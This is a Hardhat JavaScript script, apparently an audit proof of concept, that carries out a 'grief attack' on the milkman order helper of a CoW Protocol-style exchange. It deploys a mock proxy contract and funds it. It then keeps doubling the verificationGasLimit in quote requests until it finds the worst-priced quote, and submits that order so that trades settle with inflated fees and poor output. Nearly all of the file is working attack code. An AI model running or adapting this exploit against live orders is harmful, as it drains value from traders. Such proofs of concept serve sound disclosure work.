const hre = require("hardhat");
const { getQuote, submitOrder, simplifyBigNum } = require("./utils");

let sellTokenAddr, buyTokenAddr, receiver, from, sellAmountBeforeFee, appData;

// constants
const emptyBytesArr = "0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000";
appData = hre.ethers.constants.HashZero;

/**
 * TODO: Setup these vars
 */
receiver = 
sellTokenAddr = 
buyTokenAddr = 
sellAmountBeforeFee = 

/* 
This script demonstrates a simple grief attack on milkman
*/
async function main() {

  // deploy a bad slippage test contract
  const mockMilkmanProxy__Factory = await hre.ethers.getContractFactory("MockMilkmanProxy");
  const mockMilkmanProxy = await mockMilkmanProxy__Factory.deploy(sellTokenAddr);
  await mockMilkmanProxy.deployed();
  from = mockMilkmanProxy.address;
  console.log("mockMilkmanProxy deployed at: ", mockMilkmanProxy.address);

  // transfer some input token to the bad slippage test contract
  const InputToken__Factory = await hre.ethers.getContractFactory("ERC20"); 
  const inputToken = await InputToken__Factory.attach(sellTokenAddr);
  await inputToken.transfer(mockMilkmanProxy.address, sellAmountBeforeFee);
  console.log("input token transferred to mockMilkmanProxy contract");
  
  // good quote for comparison
  let verificationGasLimit = 50000;
  let quote = await getQuote({
    "sellToken": sellTokenAddr,
    "buyToken": buyTokenAddr,
    "receiver": receiver,
    "appData": appData,
    "from": from,
    "sellAmountBeforeFee": sellAmountBeforeFee,
    "verificationGasLimit": verificationGasLimit
  });
  console.log("ideal output is: " + simplifyBigNum(quote.quote.buyAmount));

  // attacker generates a shit quote by finding the worst possible verificationGasLimit val
  while(1) {
    try {
      verificationGasLimit *= 2;
      console.log("trying verificationGasLimit of: ", verificationGasLimit);
      quote = await getQuote({
        "sellToken": sellTokenAddr,
        "buyToken": buyTokenAddr,
        "receiver": receiver,
        "appData": appData,
        "from": from,
        "sellAmountBeforeFee": sellAmountBeforeFee,
        "verificationGasLimit": verificationGasLimit
      });
    } catch(err) {
      verificationGasLimit /= 2;
      quote = await getQuote({
        "sellToken": sellTokenAddr,
        "buyToken": buyTokenAddr,
        "receiver": receiver,
        "appData": appData,
        "from": from,
        "sellAmountBeforeFee": sellAmountBeforeFee,
        "verificationGasLimit": verificationGasLimit
      });
      console.log("final verificationGasLimit: ", verificationGasLimit);
      console.log("griefed output is: " + simplifyBigNum(quote.quote.buyAmount));
      console.log("griefed fee is:    " + simplifyBigNum(quote.quote.feeAmount));
      break;
    }
  }

  // create params for shit order
  const sellParams = {
    "sellToken": sellTokenAddr,
    "buyToken": buyTokenAddr,
    "receiver": receiver,
    "sellAmount": ethers.BigNumber.from(
                    sellAmountBeforeFee).sub(
                    ethers.BigNumber.from(quote.quote.feeAmount)
                  ).toString(),
    "buyAmount": quote.quote.buyAmount,
    "validTo": quote.quote.validTo,
    "appData": appData,
    "feeAmount": quote.quote.feeAmount,
    "signature": emptyBytesArr,
    "from": from,
    "quoteId": quote.quoteId
  }

  // attacker submits shit order
  const order = await submitOrder(sellParams);
  console.log("shit order submitted: ", order);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
